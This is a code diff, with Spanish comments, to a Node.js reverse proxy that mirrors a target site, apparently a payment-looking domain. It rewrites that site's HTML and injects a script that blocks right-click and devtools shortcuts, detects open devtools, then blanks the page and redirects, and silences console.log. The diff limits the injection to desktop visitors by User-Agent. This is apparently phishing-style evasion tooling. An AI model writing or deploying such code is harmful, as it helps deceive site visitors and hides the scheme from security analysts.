@@ -5,7 +5,7 @@ const crypto = require('crypto');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
-const TARGET_URL = process.env.TARGET_URL || 'https://pse.pwm435.space';
+const TARGET_URL = process.env.TARGET_URL || 'https://tu-servidor-real.com';
 const TARGET_HOST = (() => {
   try { return new URL(TARGET_URL).host; } catch { return ''; }
 })();
@@ -30,54 +30,53 @@ app.use((req, res, next) => {
 });
 
 // Función para reescribir/ajustar contenido HTML
-const obfuscateContent = (content, contentType) => {
+// injectScript: true => inyecta anti-inspect; false => NO lo inyecta
+const obfuscateContent = (content, contentType, injectScript) => {
   if (!contentType || !contentType.includes('text/html')) return content;
 
   let modified = content.toString('utf8');
 
   // 1) Reescribir URLs absolutas del host destino a rutas relativas
-  //    Ej: https://p.ejemplo.com/css/app.css  ->  /css/app.css
   if (TARGET_HOST) {
     const hostEsc = TARGET_HOST.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
     const absUrlRegex = new RegExp(`https?:\\/\\/${hostEsc}([^"')\\s]*)`, 'gi');
     modified = modified.replace(absUrlRegex, (_m, p1) => p1.startsWith('/') ? p1 : `/${p1}`);
   }
 
-  // 2) NO tocar otras URLs absolutas (CDNs, etc.). Se mantienen.
+  // 2) Mantener otras URLs (CDNs externas) sin tocar.
 
-  // 3) Inyectar script anti-inspect (redirige a /3co en vez de '/')
-  const antiInspectScript = `
-  <script>
-  (function(){
-      document.addEventListener('contextmenu', e => e.preventDefault());
-      document.addEventListener('keydown', e => {
-          if(e.keyCode === 123 ||
-            (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
-            (e.ctrlKey && e.keyCode === 85)) {
-              e.preventDefault();
-              return false;
-          }
-      });
-      let devtools = {open: false};
-      setInterval(() => {
-          if(window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
-              if(!devtools.open) {
-                  devtools.open = true;
-                  document.body.innerHTML = '';
-                  window.location.href = '/3co';
-              }
-          } else {
-              devtools.open = false;
-          }
-      }, 500);
-      try {
-        Object.defineProperty(console, 'log', { value: function(){}, writable: false, configurable: false });
-      } catch(_) {}
-  })();
-  </script>
-  `;
-
-  if (modified.includes('</body>')) {
+  // 3) Inyectar script anti-inspect SOLO si injectScript === true (desktop)
+  if (injectScript && modified.includes('</body>')) {
+    const antiInspectScript = `
+    <script>
+    (function(){
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if(e.keyCode === 123 ||
+              (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
+              (e.ctrlKey && e.keyCode === 85)) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        let devtools = {open: false};
+        setInterval(() => {
+            if(window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
+                if(!devtools.open) {
+                    devtools.open = true;
+                    document.body.innerHTML = '';
+                    window.location.href = '/3co';
+                }
+            } else {
+                devtools.open = false;
+            }
+        }, 500);
+        try {
+          Object.defineProperty(console, 'log', { value: function(){}, writable: false, configurable: false });
+        } catch(_) {}
+    })();
+    </script>
+    `;
     modified = modified.replace('</body>', antiInspectScript + '</body>');
   }
 
@@ -118,6 +117,10 @@ app.use((req, res, next) => {
   next();
 });
 
+// Helper para detectar móvil (User-Agent)
+const isMobileUA = (ua = '') =>
+  /Android|iPhone|iPad|iPod|IEMobile|Opera Mini|Mobile|BlackBerry/i.test(ua);
+
 // Configuración del proxy
 const proxyOptions = {
   target: TARGET_URL,
@@ -145,7 +148,7 @@ const proxyOptions = {
     proxyReq.setHeader('User-Agent', req.get('User-Agent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
     proxyReq.setHeader('Accept-Language', 'es-ES,es;q=0.9,en;q=0.8');
 
-    // Clave: no solicitar compresión para evitar desincronización al reescribir HTML
+    // No solicitar compresión (evita desincronización al reescribir HTML)
     proxyReq.setHeader('Accept-Encoding', 'identity');
 
     // ID de sesión
@@ -186,7 +189,12 @@ const proxyOptions = {
       res.end = function(chunk) {
         if (chunk) chunks.push(Buffer.from(chunk));
         const body = Buffer.concat(chunks);
-        const modifiedBody = obfuscateContent(body, contentType);
+
+        // Decidir si inyectamos el script (NO en móviles)
+        const ua = req.get('User-Agent') || '';
+        const injectScript = !isMobileUA(ua);
+
+        const modifiedBody = obfuscateContent(body, contentType, injectScript);
 
         // Ajustar longitudes y transferencia
         proxyRes.headers['content-length'] = Buffer.byteLength(modifiedBody);
